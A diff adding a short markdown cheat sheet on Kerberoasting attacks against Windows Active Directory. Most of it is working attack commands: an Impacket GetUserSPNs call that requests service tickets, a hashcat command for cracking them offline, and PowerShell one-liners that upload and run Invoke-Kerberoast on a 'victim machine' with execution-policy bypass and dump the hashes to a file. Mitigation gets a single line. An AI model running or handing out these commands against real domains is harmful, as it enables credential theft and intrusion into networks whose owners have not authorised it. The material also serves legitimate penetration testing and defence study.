@@ -1,0 +1,27 @@
+### What?
+Domain controller = key distribution center (KBC)
+TGT = Ticket Granting Ticket
+TGS = Ticket graning service
+
+### How?
+GetUserSPNs.py <domain>/<user>:<password> -dc-ip <DC_IP> -request
+
+-> Crach the hash using hashcat..
+hascat -m 13100 <txt-file> rockyou.txt -O
+
+### Mitigation?
+strong passwords
+least privilige prinicple (service accounts / user accounts)
+
+### professorBobeye
+Kerberoast via Windows powershell (https://www.blackhillsinfosec.com/a-toast-to-kerberoast).
+Have a look at projects like Empire, Nishang, PowerView and check for powershell scripts for kerberoasting.
+
+Get kerberos tickets via kerberoasting with access to a victim Windows machine:
+The last part (| Select-Object...) is to properly format the hash for cracking
+https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
+
+	Step 1: Upload Invoke-Kerberoast.ps1 to the victim machine (via evil-winrm's upload function if outbound connections are not allowed)	-> <uploadDir>
+	Step 2:
+		syntax : powershell -Exec Bypass "IEX(New-Object Net.WebClient).DownloadString('<uploadDir>\Invoke-Kerberoast.ps1');Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty hash | out-file -Encoding ASCII <outFile>"
+		example: powershell -nop -noni -Exec Bypass "IEX(New-Object Net.WebClient).DownloadString('c:/temp/Invoke-Kerberoast.ps1');Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty hash | out-file -Encoding ASCII C:\Temp\kerb-hash.txt"
